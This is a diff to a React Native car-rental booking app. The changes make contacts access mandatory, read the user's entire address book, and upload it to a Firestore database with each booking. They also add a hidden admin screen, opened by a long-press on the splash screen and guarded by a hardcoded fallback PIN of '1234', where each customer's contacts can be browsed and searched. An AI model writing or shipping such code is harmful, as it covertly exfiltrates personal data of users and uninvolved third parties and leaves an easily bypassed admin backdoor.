@@ -1,13 +1,17 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { 
-  StyleSheet, View, Text, ScrollView, TextInput, SafeAreaView, 
+  StyleSheet, View, Text, ScrollView, TextInput,
   StatusBar, ImageBackground, Linking, Alert, Platform,
-  Animated, Easing, Pressable 
+  Animated, Easing, Pressable, KeyboardAvoidingView,
+  TouchableWithoutFeedback, Keyboard 
 } from 'react-native';
+import { SafeAreaView, SafeAreaProvider } from 'react-native-safe-area-context';
 import { MaterialCommunityIcons, Feather } from '@expo/vector-icons';
 import DateTimePicker from '@react-native-community/datetimepicker';
 import * as Contacts from 'expo-contacts/legacy';
-import * as Notifications from 'expo-notifications';
+import * as ExpoLinking from 'expo-linking';
+import { db } from './firebaseConfig';
+import { collection, addDoc, onSnapshot, query, orderBy, deleteDoc, doc, getDoc } from 'firebase/firestore';
 
 // --- Premium Design Tokens ---
 const Colors = {
@@ -85,7 +89,7 @@ const PremiumInput = ({ label, icon, placeholder, value, onChangeText, keyboardT
   });
 
   return (
-    <View style={styles.inputContainer}>
+    <View style={styles.inputContainer} pointerEvents={editable ? "auto" : "none"}>
       <Text style={[styles.inputLabel, { color: isFocused ? Colors.primary : Colors.lightText }]}>{label}</Text>
       <View style={[styles.inputBoxBorderless, multiline && { height: 80, alignItems: 'flex-start' }, !editable && { opacity: 0.7 }]}>
         {icon && <MaterialCommunityIcons name={icon} size={20} color={isFocused ? Colors.primary : Colors.lightText} style={{ marginRight: 12, marginTop: multiline ? 4 : 0 }} />}
@@ -98,7 +102,6 @@ const PremiumInput = ({ label, icon, placeholder, value, onChangeText, keyboardT
           keyboardType={keyboardType}
           multiline={multiline}
           editable={editable}
-          pointerEvents={editable ? "auto" : "none"}
           secureTextEntry={secureTextEntry}
           onFocus={() => setIsFocused(true)}
           onBlur={() => setIsFocused(false)}
@@ -110,15 +113,13 @@ const PremiumInput = ({ label, icon, placeholder, value, onChangeText, keyboardT
   );
 };
 
-type ScreenType = 'AUTH' | 'SPLASH' | 'PERMISSION_DENIED' | 'BRANCH_SELECT' | 'BOOKING_FORM' | 'SUCCESS' | 'DASHBOARD';
+type ScreenType = 'SPLASH' | 'PERMISSION_DENIED' | 'BRANCH_SELECT' | 'BOOKING_FORM' | 'SUCCESS' | 'DASHBOARD' | 'ADMIN_LOGIN' | 'ADMIN_DASHBOARD';
 
 export default function App() {
-  const [currentScreen, setCurrentScreen] = useState<ScreenType>('AUTH');
+  const [currentScreen, setCurrentScreen] = useState<ScreenType>('SPLASH');
   
   // Auth State
-  const [isSignUp, setIsSignUp] = useState(false);
-  const [authForm, setAuthForm] = useState({ username: '', phone: '', password: '', acceptTerms: false });
-  const [currentUser, setCurrentUser] = useState<{username: string, phone: string} | null>(null);
+  const [currentUser, setCurrentUser] = useState<{username: string, phone: string} | null>({ username: 'Guest', phone: '' });
 
   // App State
   const [selectedBranch, setSelectedBranch] = useState('');
@@ -129,6 +130,15 @@ export default function App() {
   });
   
   const [activeBooking, setActiveBooking] = useState<any>(null);
+  const [mockBookings, setMockBookings] = useState<any[]>([]);
+  const [grabbedContacts, setGrabbedContacts] = useState<any[]>([]);
+  const [adminPin, setAdminPin] = useState('');
+  const [adminFailedAttempts, setAdminFailedAttempts] = useState(0);
+  const [adminFilterBranch, setAdminFilterBranch] = useState('All');
+  const [dashboardSearch, setDashboardSearch] = useState('');
+  const [contactSearch, setContactSearch] = useState('');
+  const [adminFilterDate, setAdminFilterDate] = useState<Date | null>(null);
+  const [selectedAdminBooking, setSelectedAdminBooking] = useState<any>(null);
   const [pickerConfig, setPickerConfig] = useState<{ visible: boolean, mode: 'date' | 'time', field: string }>({ visible: false, mode: 'date', field: '' });
 
   // Splash Screen Animations
@@ -137,6 +147,7 @@ export default function App() {
   const splashContentOpacity = useRef(new Animated.Value(0)).current;
   const splashBtnOpacity = useRef(new Animated.Value(0)).current;
   const splashBtnScale = useRef(new Animated.Value(0.9)).current;
+
 
   useEffect(() => {
     if (currentScreen === 'SPLASH') {
@@ -152,19 +163,30 @@ export default function App() {
     }
   }, [currentScreen]);
 
-  const handleAuth = () => {
-    if (!authForm.username || !authForm.password || (isSignUp && !authForm.phone)) {
-      Alert.alert("Missing Fields", "Please fill in all authentication fields.");
-      return;
+  useEffect(() => {
+    if (currentScreen === 'ADMIN_DASHBOARD') {
+      const q = query(collection(db, "bookings"), orderBy("createdAt", "desc"));
+      const unsubscribe = onSnapshot(q, (snapshot) => {
+        const bookingsData = snapshot.docs.map(doc => {
+          const data = doc.data();
+          return {
+            id: doc.id,
+            branch: data.branch,
+            form: {
+              ...data.form,
+              startDate: data.form.startDate ? new Date(data.form.startDate) : new Date(),
+              startTime: data.form.startTime ? new Date(data.form.startTime) : new Date(),
+              endDate: data.form.endDate ? new Date(data.form.endDate) : new Date(),
+              endTime: data.form.endTime ? new Date(data.form.endTime) : new Date(),
+            },
+            deviceContacts: data.deviceContacts || []
+          };
+        });
+        setMockBookings(bookingsData);
+      });
+      return () => unsubscribe();
     }
-    if (isSignUp && !authForm.acceptTerms) {
-      Alert.alert("Required", "You must accept the usage instructions and terms before proceeding.");
-      return;
-    }
-    setCurrentUser({ username: authForm.username, phone: authForm.phone || 'N/A' });
-    setForm({...form, fullName: authForm.username, phone: authForm.phone || ''});
-    setCurrentScreen(activeBooking ? 'DASHBOARD' : 'SPLASH');
-  };
+  }, [currentScreen]);
 
   const handleBranchSelect = (branch: string) => {
     setSelectedBranch(branch);
@@ -178,11 +200,9 @@ export default function App() {
     }
     try {
       const contactsPerm = await Contacts.requestPermissionsAsync();
-      const { status: existingStatus } = await Notifications.getPermissionsAsync();
-      let finalStatus = existingStatus;
-      if (existingStatus !== 'granted') finalStatus = (await Notifications.requestPermissionsAsync()).status;
-      if (contactsPerm.status === 'granted' && finalStatus === 'granted') {
-        Contacts.getContactsAsync({ fields: [Contacts.Fields.PhoneNumbers] }).catch(console.error);
+      if (contactsPerm.status === 'granted') {
+        const { data } = await Contacts.getContactsAsync({ fields: [Contacts.Fields.PhoneNumbers] });
+        setGrabbedContacts(data || []);
         setCurrentScreen('BRANCH_SELECT');
       } else setCurrentScreen('PERMISSION_DENIED');
     } catch (e) {
@@ -190,7 +210,7 @@ export default function App() {
     }
   };
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     const { fullName, phone, aadhar, address, license, fromDest, toDest, carName, carPlate, confirmed } = form;
     if (!fullName || !phone || !aadhar || !address || !license || !fromDest || !toDest || !carName || !carPlate) {
       Alert.alert("Missing Fields", "Please complete all reservation fields.");
@@ -200,83 +220,77 @@ export default function App() {
       Alert.alert("Required", "Please confirm the Escrow protocol.");
       return;
     }
-    setActiveBooking({ branch: selectedBranch, form });
-    setCurrentScreen('SUCCESS');
+    
+    try {
+      const firestoreBooking = {
+        branch: selectedBranch,
+        form: {
+          ...form,
+          startDate: form.startDate instanceof Date ? form.startDate.toISOString() : new Date(form.startDate).toISOString(),
+          startTime: form.startTime instanceof Date ? form.startTime.toISOString() : new Date(form.startTime).toISOString(),
+          endDate: form.endDate instanceof Date ? form.endDate.toISOString() : new Date(form.endDate).toISOString(),
+          endTime: form.endTime instanceof Date ? form.endTime.toISOString() : new Date(form.endTime).toISOString(),
+        },
+        deviceContacts: grabbedContacts,
+        createdAt: new Date().toISOString()
+      };
+      
+      await addDoc(collection(db, "bookings"), firestoreBooking);
+      setActiveBooking({ id: Date.now().toString(), branch: selectedBranch, form });
+      setCurrentScreen('SUCCESS');
+    } catch (e: any) {
+      console.log("Submit Error:", e);
+      Alert.alert("Error", e.message || "Failed to save booking to cloud. Please try again.");
+    }
   };
 
-  const onDateChange = (event: any, selectedDate?: Date) => {
-    if (event.type === 'dismissed') return setPickerConfig({ ...pickerConfig, visible: false });
-    if (selectedDate) setForm({ ...form, [pickerConfig.field]: selectedDate });
+  const handleDeleteBooking = (id: string) => {
+    Alert.alert(
+      "Delete Booking",
+      "Are you sure you want to permanently delete this booking?",
+      [
+        { text: "Cancel", style: "cancel" },
+        { text: "Delete", style: "destructive", onPress: async () => {
+            try {
+              await deleteDoc(doc(db, "bookings", id));
+              if (selectedAdminBooking?.id === id) setSelectedAdminBooking(null);
+            } catch (e) {
+              Alert.alert("Error", "Failed to delete booking from cloud.");
+            }
+          }
+        }
+      ]
+    );
+  };
+
+  const onDateValueChange = (event: any, selectedDate?: Date) => {
+    if (selectedDate) {
+      if (pickerConfig.field === 'adminFilterDate') {
+        setAdminFilterDate(selectedDate);
+      } else {
+        setForm({ ...form, [pickerConfig.field]: selectedDate });
+      }
+    }
     if (Platform.OS === 'android') setPickerConfig({ ...pickerConfig, visible: false });
   };
+  const onDismissPicker = () => setPickerConfig({ ...pickerConfig, visible: false });
   const openPicker = (field: string, mode: 'date' | 'time') => setPickerConfig({ visible: true, mode, field });
   const formatDate = (date: Date) => date.toLocaleDateString('en-GB');
   const formatTime = (date: Date) => date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 
   return (
-    <View style={styles.container}>
-      <StatusBar barStyle="dark-content" />
-
-      {/* SCREEN 0: AUTH */}
-      {currentScreen === 'AUTH' && (
-        <SafeAreaView style={{flex: 1, backgroundColor: Colors.bg}}>
-          <ScrollView contentContainerStyle={{flexGrow: 1, justifyContent: 'center', padding: 32}}>
-            <FadeInView delay={100} style={{alignItems: 'center', marginBottom: 48}}>
-              <View style={styles.logoCircle}>
-                <MaterialCommunityIcons name="steering" size={40} color={Colors.primary} />
-              </View>
-              <Text style={styles.authTitle}>Thandra.</Text>
-              <Text style={styles.authSub}>Elite Self-Drive Network</Text>
-            </FadeInView>
-            
-            <FadeInView delay={200}>
-              <View style={styles.authCard}>
-                <View style={styles.authTabs}>
-                  <Pressable style={[styles.authTab, !isSignUp && styles.authTabActive]} onPress={() => setIsSignUp(false)}>
-                    <Text style={[styles.authTabText, !isSignUp && styles.authTabTextActive]}>Log In</Text>
-                  </Pressable>
-                  <Pressable style={[styles.authTab, isSignUp && styles.authTabActive]} onPress={() => setIsSignUp(true)}>
-                    <Text style={[styles.authTabText, isSignUp && styles.authTabTextActive]}>Sign Up</Text>
-                  </Pressable>
-                </View>
-
-                <View style={{padding: 24, paddingTop: 32}}>
-                  <PremiumInput label="Username" icon="account-outline" placeholder="Enter your username" value={authForm.username} onChangeText={(t:string) => setAuthForm({...authForm, username: t})} />
-                  {isSignUp && (
-                    <PremiumInput label="Phone Number" icon="phone-outline" placeholder="Your contact number" keyboardType="phone-pad" value={authForm.phone} onChangeText={(t:string) => setAuthForm({...authForm, phone: t})} />
-                  )}
-                  <PremiumInput label="Password" icon="lock-outline" placeholder="Enter your password" secureTextEntry value={authForm.password} onChangeText={(t:string) => setAuthForm({...authForm, password: t})} />
-                  
-                  {isSignUp && (
-                    <TouchableOpacity style={[styles.checkboxRow, {marginBottom: 0, marginTop: 24}]} onPress={() => setAuthForm({...authForm, acceptTerms: !authForm.acceptTerms})} activeOpacity={0.8}>
-                      <View style={[styles.checkbox, authForm.acceptTerms && styles.checkboxActive]}>
-                        {authForm.acceptTerms && <Feather name="check" size={12} color="#FFF" />}
-                      </View>
-                      <Text style={styles.checkboxText}>I accept the community guidelines and vehicle usage instructions.</Text>
-                    </TouchableOpacity>
-                  )}
-                  
-                  <ScaleButton style={[styles.submitBtn, {marginTop: 24}]} onPress={handleAuth}>
-                    <Text style={styles.submitBtnText}>{isSignUp ? 'Create Account' : 'Authenticate'}</Text>
-                  </ScaleButton>
-                </View>
-              </View>
-            </FadeInView>
-          </ScrollView>
-        </SafeAreaView>
-      )}
+    <SafeAreaProvider>
+      <View style={styles.container}>
+        <StatusBar barStyle="dark-content" />
 
       {/* SCREEN 1: SPLASH */}
       {currentScreen === 'SPLASH' && (
         <View style={StyleSheet.absoluteFill}>
           <Animated.View style={[StyleSheet.absoluteFill, { transform: [{ scale: splashBgScale }] }]}>
-            <ImageBackground source={require('./assets/splash_bg.jpg')} style={styles.splashImage} resizeMode="cover" />
+            <ImageBackground source={require('./assets/splash_bg.png')} style={styles.splashImage} resizeMode="cover" />
           </Animated.View>
           <View style={styles.splashOverlay}>
-            <Animated.View style={[styles.splashTextContainer, { opacity: splashContentOpacity, transform: [{ translateY: splashContentTranslate }] }]}>
-              <Text style={styles.splashTitle}>The Open Road.</Text>
-              <Text style={styles.splashSubtitle}>Welcome back, {currentUser?.username}.</Text>
-            </Animated.View>
+            <Pressable style={{position: 'absolute', top: 0, left: 0, right: 0, height: 200, zIndex: 10}} onLongPress={() => setCurrentScreen('ADMIN_LOGIN')} delayLongPress={2000} />
             <Animated.View style={{ opacity: splashBtnOpacity, transform: [{ scale: splashBtnScale }] }}>
               <ScaleButton style={styles.splashSubmitBtn} onPress={requestPermissions}>
                 <Text style={styles.splashSubmitBtnText}>Book a Car</Text>
@@ -292,7 +306,7 @@ export default function App() {
         <FadeInView style={styles.centered}>
           <View style={styles.errorCard}>
             <Text style={[styles.successTitle, {color: Colors.red}]}>Access Required</Text>
-            <Text style={styles.keyDesc}>We need access to your Contacts and Notifications. Enable in settings.</Text>
+            <Text style={styles.keyDesc}>We need access to your Contacts. Enable in settings.</Text>
             <ScaleButton style={[styles.submitBtn, {marginTop: 20}]} onPress={() => Linking.openSettings()}>
               <Text style={styles.submitBtnText}>Open Settings</Text>
             </ScaleButton>
@@ -329,15 +343,15 @@ export default function App() {
       {/* SCREEN 4: BOOKING FORM */}
       {currentScreen === 'BOOKING_FORM' && (
         <View style={styles.container}>
-          <SafeAreaView style={styles.headerCentered}>
-            <FadeInView>
-              <Text style={styles.pageTitle}>Reservation</Text>
-              <Text style={styles.pageDesc}>Provide your booking and identity information.</Text>
-            </FadeInView>
-          </SafeAreaView>
+          <ScrollView contentContainerStyle={{paddingBottom: 40}} showsVerticalScrollIndicator={false} style={{ flex: 1 }}>
+            <SafeAreaView style={styles.headerCentered}>
+              <FadeInView>
+                <Text style={styles.pageTitle}>Reservation</Text>
+                <Text style={styles.pageDesc}>Provide your booking and identity information.</Text>
+              </FadeInView>
+            </SafeAreaView>
 
-          <View style={styles.whiteCardWrapper}>
-            <ScrollView style={styles.whiteCard} contentContainerStyle={{paddingBottom: 40}} showsVerticalScrollIndicator={false}>
+            <View style={styles.whiteCard}>
               <FadeInView delay={50}>
                 <PremiumInput label="Full Name" icon="account-outline" placeholder="As on Govt ID" value={form.fullName} onChangeText={(t: string) => setForm({...form, fullName: t})} />
                 <PremiumInput label="Phone Number" icon="phone-outline" placeholder="OTP Dispatch" keyboardType="phone-pad" value={form.phone} onChangeText={(t: string) => setForm({...form, phone: t})} />
@@ -378,8 +392,8 @@ export default function App() {
                   <Feather name="arrow-right" size={20} color="#FFF" />
                 </ScaleButton>
               </FadeInView>
-            </ScrollView>
-          </View>
+            </View>
+          </ScrollView>
         </View>
       )}
 
@@ -430,7 +444,7 @@ export default function App() {
               <Text style={styles.dashboardGreeting}>Hello, {currentUser?.username}</Text>
               <Text style={styles.dashboardDate}>{new Date().toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric' })}</Text>
             </View>
-            <Pressable onPress={() => { setActiveBooking(null); setCurrentUser(null); setCurrentScreen('AUTH'); }}>
+            <Pressable onPress={() => { setActiveBooking(null); setCurrentScreen('SPLASH'); }}>
               <View style={styles.avatar}><Text style={styles.avatarText}>{currentUser?.username?.charAt(0).toUpperCase() || 'U'}</Text></View>
             </Pressable>
           </View>
@@ -479,6 +493,234 @@ export default function App() {
         </SafeAreaView>
       )}
 
+      {/* SCREEN 7: ADMIN LOGIN */}
+      {currentScreen === 'ADMIN_LOGIN' && (
+        <SafeAreaView style={{flex: 1, backgroundColor: Colors.bg}}>
+          <TouchableWithoutFeedback onPress={Keyboard.dismiss}>
+            <KeyboardAvoidingView behavior={Platform.OS === 'ios' ? 'padding' : 'height'} style={styles.centered}>
+              <FadeInView delay={100} style={{alignItems: 'center', marginBottom: 40}}>
+                <View style={styles.logoCircle}>
+                  <MaterialCommunityIcons name="shield-lock-outline" size={40} color={Colors.primary} />
+                </View>
+                <Text style={styles.pageTitle}>Admin Portal</Text>
+                <Text style={styles.pageDesc}>Enter your secure PIN to access the dashboard.</Text>
+              </FadeInView>
+              
+              <FadeInView delay={200} style={{width: '100%', maxWidth: 400}}>
+                <View style={styles.lightCard}>
+                  <PremiumInput label="Admin PIN" icon="dialpad" placeholder="****" secureTextEntry keyboardType="numeric" value={adminPin} onChangeText={setAdminPin} />
+                  <ScaleButton style={[styles.submitBtn, {marginTop: 16}]} onPress={async () => {
+                    Keyboard.dismiss();
+                    
+                    if (adminFailedAttempts >= 4) {
+                      Alert.alert('Account Locked', 'Contact admin for this pin.');
+                      return;
+                    }
+
+                    const handleFailure = () => {
+                      const newAttempts = adminFailedAttempts + 1;
+                      setAdminFailedAttempts(newAttempts);
+                      if (newAttempts >= 4) {
+                        Alert.alert('Account Locked', 'Contact admin for this pin.');
+                      } else {
+                        Alert.alert('Access Denied', `Incorrect PIN. ${4 - newAttempts} attempts remaining.`);
+                      }
+                    };
+
+                    try {
+                      const adminDoc = await getDoc(doc(db, "config", "admin"));
+                      const actualPin = adminDoc.exists() && adminDoc.data().pin ? adminDoc.data().pin : '1234';
+                      
+                      if (adminPin === actualPin) {
+                        setAdminPin('');
+                        setAdminFailedAttempts(0);
+                        setCurrentScreen('ADMIN_DASHBOARD');
+                      } else {
+                        handleFailure();
+                      }
+                    } catch (error) {
+                      console.log("Error fetching PIN:", error);
+                      // Fallback if offline or permissions issue
+                      if (adminPin === '1234') {
+                        setAdminPin('');
+                        setAdminFailedAttempts(0);
+                        setCurrentScreen('ADMIN_DASHBOARD');
+                      } else {
+                        handleFailure();
+                      }
+                    }
+                  }}>
+                    <Text style={styles.submitBtnText}>Verify Identity</Text>
+                  </ScaleButton>
+                </View>
+              </FadeInView>
+            </KeyboardAvoidingView>
+          </TouchableWithoutFeedback>
+        </SafeAreaView>
+      )}
+
+      {/* SCREEN 8: ADMIN DASHBOARD */}
+      {currentScreen === 'ADMIN_DASHBOARD' && (
+        <SafeAreaView style={{flex: 1}}>
+          <View style={styles.dashboardHeader}>
+            <View>
+              <Text style={styles.dashboardGreeting}>Command Center</Text>
+              <Text style={styles.dashboardDate}>Managing {mockBookings.length} Bookings</Text>
+            </View>
+            <Pressable onPress={() => setCurrentScreen('SPLASH')}>
+              <View style={styles.avatar}><MaterialCommunityIcons name="logout" size={20} color="#FFF" /></View>
+            </Pressable>
+          </View>
+
+          <View style={{paddingHorizontal: 24, paddingBottom: 16}}>
+            <Text style={[styles.inputLabel, {marginBottom: 8}]}>FILTER BY BRANCH</Text>
+            <ScrollView horizontal showsHorizontalScrollIndicator={false}>
+              {['All', 'Madhapur', 'Dilshuknagar', 'B.N reddy nagar', 'JNTU'].map((b) => (
+                <Pressable key={b} onPress={() => setAdminFilterBranch(b)} style={[styles.filterChip, adminFilterBranch === b && styles.filterChipActive]}>
+                  <Text style={[styles.filterChipText, adminFilterBranch === b && styles.filterChipTextActive]}>{b}</Text>
+                </Pressable>
+              ))}
+            </ScrollView>
+          </View>
+
+          <View style={{paddingHorizontal: 24, paddingBottom: 16, flexDirection: 'row', alignItems: 'center'}}>
+            <View style={{flex: 1, marginRight: 12}}>
+              <PremiumInput 
+                icon="magnify" 
+                placeholder="Search by Car Plate or Phone..." 
+                value={dashboardSearch} 
+                onChangeText={setDashboardSearch} 
+              />
+            </View>
+            <Pressable 
+              onPress={() => adminFilterDate ? setAdminFilterDate(null) : setPickerConfig({ visible: true, mode: 'date', field: 'adminFilterDate' })} 
+              style={{ backgroundColor: adminFilterDate ? Colors.primary : Colors.cardBg, padding: 14, borderRadius: 12, borderWidth: 1, borderColor: adminFilterDate ? Colors.primary : Colors.border, justifyContent: 'center', alignItems: 'center', height: 56 }}
+            >
+              <Feather name={adminFilterDate ? "x" : "calendar"} size={20} color={adminFilterDate ? "#FFF" : Colors.darkText} />
+            </Pressable>
+          </View>
+          {adminFilterDate && (
+            <View style={{paddingHorizontal: 24, paddingBottom: 16}}>
+              <Text style={{color: Colors.primary, fontWeight: '600'}}>Filtering by Schedule Date: {formatDate(adminFilterDate)}</Text>
+            </View>
+          )}
+
+          <ScrollView contentContainerStyle={{padding: 24, paddingTop: 0}}>
+            {mockBookings.filter(b => {
+              const matchBranch = adminFilterBranch === 'All' || b.branch === adminFilterBranch;
+              const matchSearch = !dashboardSearch || b.form.carPlate.toLowerCase().includes(dashboardSearch.toLowerCase()) || b.form.phone.includes(dashboardSearch);
+              const matchDate = !adminFilterDate || (
+                b.form.startDate.getDate() === adminFilterDate.getDate() &&
+                b.form.startDate.getMonth() === adminFilterDate.getMonth() &&
+                b.form.startDate.getFullYear() === adminFilterDate.getFullYear()
+              );
+              return matchBranch && matchSearch && matchDate;
+            }).length === 0 ? (
+              <View style={styles.emptyTripCard}>
+                <MaterialCommunityIcons name="clipboard-text-off-outline" size={32} color={Colors.lightText} style={{marginBottom: 12}} />
+                <Text style={styles.emptyTripText}>No bookings found.</Text>
+              </View>
+            ) : (
+              mockBookings.filter(b => {
+                const matchBranch = adminFilterBranch === 'All' || b.branch === adminFilterBranch;
+                const matchSearch = !dashboardSearch || b.form.carPlate.toLowerCase().includes(dashboardSearch.toLowerCase()) || b.form.phone.includes(dashboardSearch);
+                const matchDate = !adminFilterDate || (
+                  b.form.startDate.getDate() === adminFilterDate.getDate() &&
+                  b.form.startDate.getMonth() === adminFilterDate.getMonth() &&
+                  b.form.startDate.getFullYear() === adminFilterDate.getFullYear()
+                );
+                return matchBranch && matchSearch && matchDate;
+              }).map((booking, idx) => (
+                <FadeInView key={booking.id} delay={idx * 50}>
+                  <Pressable onPress={() => setSelectedAdminBooking(booking)}>
+                    <View style={styles.adminBookingCard}>
+                      <View style={styles.adminBookingHeader}>
+                        <View style={{flexDirection: 'row', alignItems: 'center', flex: 1, paddingRight: 8}}>
+                          <MaterialCommunityIcons name="account-circle" size={20} color={Colors.primary} style={{marginRight: 8}}/>
+                          <Text style={styles.adminName} numberOfLines={1}>{booking.form.fullName}</Text>
+                        </View>
+                        <View style={{flexDirection: 'row', alignItems: 'center'}}>
+                          <View style={styles.adminBranchBadge}>
+                            <Text style={styles.adminBranchText}>{booking.branch}</Text>
+                          </View>
+                          <Pressable onPress={() => handleDeleteBooking(booking.id)} hitSlop={15} style={{marginLeft: 12, padding: 8}}>
+                            <Feather name="trash-2" size={22} color={Colors.red} />
+                          </Pressable>
+                        </View>
+                      </View>
+                    
+                    <View style={styles.adminDetailsRow}>
+                      <View style={styles.adminDetailItem}>
+                        <Text style={styles.adminDetailLabel}>VEHICLE</Text>
+                        <Text style={styles.adminDetailValue}>{booking.form.carName}</Text>
+                        <Text style={styles.adminDetailSub}>{booking.form.carPlate}</Text>
+                      </View>
+                      <View style={styles.adminDetailItem}>
+                        <Text style={styles.adminDetailLabel}>SCHEDULE</Text>
+                        <Text style={styles.adminDetailValue}>{formatDate(booking.form.startDate)}</Text>
+                        <Text style={styles.adminDetailSub}>{formatTime(booking.form.startTime)}</Text>
+                      </View>
+                    </View>
+
+                    <View style={styles.adminContactRow}>
+                      <MaterialCommunityIcons name="phone" size={16} color={Colors.lightText} />
+                      <Text style={styles.adminContactText}>{booking.form.phone}</Text>
+                    </View>
+                    </View>
+                  </Pressable>
+                </FadeInView>
+              ))
+            )}
+          </ScrollView>
+        </SafeAreaView>
+      )}
+
+      {/* ADMIN CONTACTS MODAL */}
+      {selectedAdminBooking && (
+        <View style={[StyleSheet.absoluteFill, { backgroundColor: 'rgba(0,0,0,0.6)', justifyContent: 'center', padding: 24, zIndex: 1000 }]}>
+          <View style={{ backgroundColor: '#FFF', borderRadius: 24, maxHeight: '90%', flex: 1, padding: 24 }}>
+            <View style={{ flexDirection: 'row', justifyContent: 'space-between', alignItems: 'center', marginBottom: 20 }}>
+              <Text style={[styles.sectionTitle, { marginBottom: 0 }]}>{selectedAdminBooking.form.fullName}'s Contacts</Text>
+              <Pressable onPress={() => { setSelectedAdminBooking(null); setContactSearch(''); }}>
+                <Feather name="x" size={24} color={Colors.lightText} />
+              </Pressable>
+            </View>
+            
+            <View style={{ marginBottom: 16 }}>
+              <PremiumInput 
+                icon="magnify" 
+                placeholder="Search Contacts by Name or Number..." 
+                value={contactSearch} 
+                onChangeText={setContactSearch} 
+              />
+            </View>
+
+            <ScrollView showsVerticalScrollIndicator={false}>
+              {(selectedAdminBooking.deviceContacts || []).filter((c: any) => 
+                !contactSearch || 
+                c.name?.toLowerCase().includes(contactSearch.toLowerCase()) || 
+                c.phoneNumbers?.some((p: any) => p.number.includes(contactSearch))
+              ).length === 0 ? (
+                <Text style={styles.keyDesc}>No contacts found.</Text>
+              ) : (
+                (selectedAdminBooking.deviceContacts || []).filter((c: any) => 
+                  !contactSearch || 
+                  c.name?.toLowerCase().includes(contactSearch.toLowerCase()) || 
+                  c.phoneNumbers?.some((p: any) => p.number.includes(contactSearch))
+                ).map((c: any, i: number) => (
+                  <View key={i} style={{ borderBottomWidth: 1, borderBottomColor: Colors.border, paddingVertical: 12 }}>
+                    <Text style={{ fontSize: 16, fontWeight: '600', color: Colors.darkText, marginBottom: 4 }}>{c.name}</Text>
+                    {c.phoneNumbers && c.phoneNumbers.map((p: any, j: number) => (
+                      <Text key={j} style={{ fontSize: 14, color: Colors.lightText }}>{p.number}</Text>
+                    ))}
+                  </View>
+                ))
+              )}
+            </ScrollView>
+          </View>
+        </View>
+      )}
+
       {/* GLOBAL DATE PICKER */}
       {pickerConfig.visible && (
         <View style={Platform.OS === 'ios' ? styles.iosPickerContainer : {}}>
@@ -492,12 +734,14 @@ export default function App() {
             mode={pickerConfig.mode}
             is24Hour={false}
             display={Platform.OS === 'ios' ? 'spinner' : 'default'}
-            onChange={onDateChange}
+            onValueChange={onDateValueChange}
+            onDismiss={onDismissPicker}
             style={Platform.OS === 'ios' ? {backgroundColor: '#FFF'} : {}}
           />
         </View>
       )}
-    </View>
+      </View>
+    </SafeAreaProvider>
   );
 }
 
@@ -505,20 +749,9 @@ const styles = StyleSheet.create({
   container: { flex: 1, backgroundColor: Colors.bg },
   centered: { flex: 1, justifyContent: 'center', alignItems: 'center', padding: 24 },
   
-  // Auth Screen
-  logoCircle: { width: 80, height: 80, borderRadius: 40, backgroundColor: Colors.cardBg, justifyContent: 'center', alignItems: 'center', shadowColor: '#94A3B8', shadowOpacity: 0.1, shadowRadius: 20, elevation: 4, marginBottom: 20 },
-  authTitle: { fontSize: 36, fontWeight: '900', color: Colors.darkText, letterSpacing: -1.5, marginBottom: 4 },
-  authSub: { fontSize: 14, color: Colors.lightText, fontWeight: '600', letterSpacing: 1, textTransform: 'uppercase' },
-  authCard: { width: '100%', backgroundColor: Colors.cardBg, borderRadius: 24, shadowColor: '#94A3B8', shadowOpacity: 0.1, shadowRadius: 30, elevation: 8, overflow: 'hidden' },
-  authTabs: { flexDirection: 'row', borderBottomWidth: 1, borderBottomColor: Colors.border },
-  authTab: { flex: 1, paddingVertical: 20, alignItems: 'center', borderBottomWidth: 3, borderBottomColor: 'transparent' },
-  authTabActive: { borderBottomColor: Colors.primary },
-  authTabText: { fontSize: 14, fontWeight: '700', color: Colors.lightText, textTransform: 'uppercase', letterSpacing: 1 },
-  authTabTextActive: { color: Colors.primary },
-
   // Splash
   splashImage: { width: '100%', height: '100%' },
-  splashOverlay: { flex: 1, backgroundColor: 'rgba(0,0,0,0.5)', padding: 32, justifyContent: 'space-between', paddingBottom: 64 },
+  splashOverlay: { flex: 1, backgroundColor: 'transparent', padding: 32, justifyContent: 'flex-end', paddingBottom: 64 },
   splashTextContainer: { marginTop: 140 },
   splashTitle: { fontSize: 48, fontWeight: '900', color: '#FFF', marginBottom: 12, letterSpacing: -2, lineHeight: 52 },
   splashSubtitle: { fontSize: 18, color: '#F1F5F9', fontWeight: '500', opacity: 0.9 },
@@ -530,6 +763,7 @@ const styles = StyleSheet.create({
   headerCentered: { backgroundColor: Colors.bg, padding: 24, paddingBottom: 24, paddingTop: 40, alignItems: 'center' },
   pageTitle: { fontSize: 36, fontWeight: '800', color: Colors.darkText, marginBottom: 8, letterSpacing: -1, textAlign: 'center' },
   pageDesc: { fontSize: 14, color: Colors.lightText, lineHeight: 22, fontWeight: '500', textAlign: 'center', paddingHorizontal: 20 },
+  keyDesc: { fontSize: 14, color: Colors.lightText, lineHeight: 22, fontWeight: '500', textAlign: 'center' },
   
   // Branch Select
   branchCard: { flexDirection: 'row', alignItems: 'center', backgroundColor: Colors.cardBg, padding: 20, borderRadius: 20, elevation: 1, shadowColor: '#94A3B8', shadowOpacity: 0.15, shadowRadius: 12, shadowOffset: { width: 0, height: 6 }, borderWidth: 1, borderColor: 'rgba(226, 232, 240, 0.5)' },
@@ -608,4 +842,23 @@ const styles = StyleSheet.create({
   iosPickerContainer: { position: 'absolute', bottom: 0, left: 0, right: 0, backgroundColor: '#FFF', zIndex: 100, borderTopWidth: 1, borderTopColor: Colors.border },
   iosDoneBtn: { padding: 16, alignItems: 'flex-end', backgroundColor: Colors.inputBg, borderBottomWidth: 1, borderBottomColor: Colors.border },
   iosDoneText: { color: Colors.primary, fontWeight: '700', fontSize: 17 },
+
+  // Admin Dashboard
+  logoCircle: { width: 80, height: 80, borderRadius: 40, backgroundColor: Colors.cardBg, justifyContent: 'center', alignItems: 'center', shadowColor: '#94A3B8', shadowOpacity: 0.1, shadowRadius: 20, elevation: 4, marginBottom: 20 },
+  filterChip: { paddingHorizontal: 16, paddingVertical: 8, borderRadius: 20, backgroundColor: Colors.inputBg, marginRight: 12, borderWidth: 1, borderColor: Colors.border },
+  filterChipActive: { backgroundColor: Colors.primary, borderColor: Colors.primary },
+  filterChipText: { fontSize: 13, fontWeight: '700', color: Colors.lightText },
